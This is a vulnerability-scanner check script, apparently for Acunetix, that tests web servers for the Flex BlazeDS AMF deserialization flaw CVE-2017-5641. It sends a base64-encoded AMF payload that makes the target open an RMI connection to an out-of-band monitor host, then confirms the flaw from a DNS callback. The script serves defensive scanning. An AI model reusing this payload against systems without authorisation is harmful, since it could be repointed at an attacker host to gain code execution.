/**
title: Flex BlazeDS AMF Deserialization RCE CVE-2017-5641
tags: java, blazeds, deserialization
description:
    Tests if a server uses a version of Flex BlazeDS vulnerable to AMF deserialization RCE
**/
/// <reference path="../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");

// debugging
function trace(msg) {
    ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert(job, acumonitor_data) {
    scanState.addVuln({
        typeId: 'BlazeDS_AMF_Deser.xml',
        tags: ["verified", "acumonitor", "confidence.100"],
        location: scriptArg.location,
        http: job,
        details: { "acumonitor_data": acumonitor_data },
        detailsType: 1
    });
}

// OOB test for AMF deserialization
function testVulnerability() {

    let startPayload = ax.util.base64Decode('AAMAAAABAAAAAP////8RCgczc3VuLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlZgA=');
    let endPayload = ax.util.base64Decode('AAAnD/lqdnt83mhPdtiqPQAAAVuwTB2BgAEACg==');
    let rndToken = acumonitor.signToken('hit' + rnd.randStrDigits(10));
    let endpoint = `${rndToken}.${acumonitor.AMServer}`;
    let amfPayload = startPayload + String.fromCharCode(endpoint.length) + endpoint + endPayload;

    // build from scratch 
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);
    job.request.assign(scriptArg.http.request);

    job.request.setHeader("Content-Type", "application/x-amf");
    job.request.body = amfPayload;

    let http = ax.http.execute(job).sync();
    // trace("http " + JSON.stringify(http));

    var result = acumonitor.verifyInjectionDNS(rndToken, ["AAAA", "A"]);

    // check if vulnerable
    if (result) {
        // trace("ALERT!!!!!");
        alert(job, result);
        return true;
    }

}

// main function
function main() {
    // only endpoints with AMF content type
    // trace("scriptArg.location.url.path (inside) " + scriptArg.location.url.path);
    if (scriptArg.http.response.isType('application/x-amf')
        || (scriptArg.http.request.method == "POST" && scriptArg.http.request.isType('application/x-amf'))) {

        flow.callIdOnce(
            "blazeds-amf-deser-" + scriptArg.http.hostname,
            testVulnerability
        );
    }
}

if (acumonitor.checkAcumonitor(scanState)) { main(); }
